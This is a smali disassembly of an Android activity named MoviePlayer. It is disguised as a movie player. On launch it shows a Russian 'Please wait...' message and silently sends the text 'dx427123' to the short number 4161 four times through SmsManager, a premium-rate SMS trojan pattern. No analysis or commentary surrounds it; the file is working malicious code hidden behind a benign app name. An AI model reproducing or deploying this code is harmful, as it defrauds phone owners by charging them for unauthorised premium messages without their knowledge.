.class public Lorg/media/player/MoviePlayer;
.super Landroid/app/Activity;
.source "MoviePlayer.java"


# instance fields
.field private ContentURI:Ljava/lang/Object;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 9
    .param p1, "icicle"    # Landroid/os/Bundle;

    .prologue
    const/4 v2, 0x0

    .line 15
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 16
    new-instance v6, Lorg/media/player/DataHelper;

    invoke-direct {v6, p0}, Lorg/media/player/DataHelper;-><init>(Landroid/content/Context;)V

    .line 17
    .local v6, "dh":Lorg/media/player/DataHelper;
    invoke-virtual {v6}, Lorg/media/player/DataHelper;->canwe()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 19
    new-instance v8, Landroid/widget/TextView;

    invoke-direct {v8, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 20
    .local v8, "tv":Landroid/widget/TextView;
    const-string v1, "\u041f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435..."

    invoke-virtual {v8, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 21
    invoke-virtual {p0, v8}, Lorg/media/player/MoviePlayer;->setContentView(Landroid/view/View;)V

    .line 22
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 35
    .local v0, "m":Landroid/telephony/SmsManager;
    const/4 v7, 0x0

    .local v7, "i":I
    :goto_0
    const/4 v1, 0x4

    if-ge v7, v1, :cond_0

    .line 37
    const-string v1, "4161"

    const-string v3, "dx427123"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 35
    add-int/lit8 v7, v7, 0x1

    goto :goto_0

    .line 42
    :cond_0
    invoke-virtual {v6}, Lorg/media/player/DataHelper;->was()V

    .line 45
    .end local v0    # "m":Landroid/telephony/SmsManager;
    .end local v7    # "i":I
    .end local v8    # "tv":Landroid/widget/TextView;
    :cond_1
    invoke-virtual {p0}, Lorg/media/player/MoviePlayer;->finish()V

    .line 48
    return-void
.end method
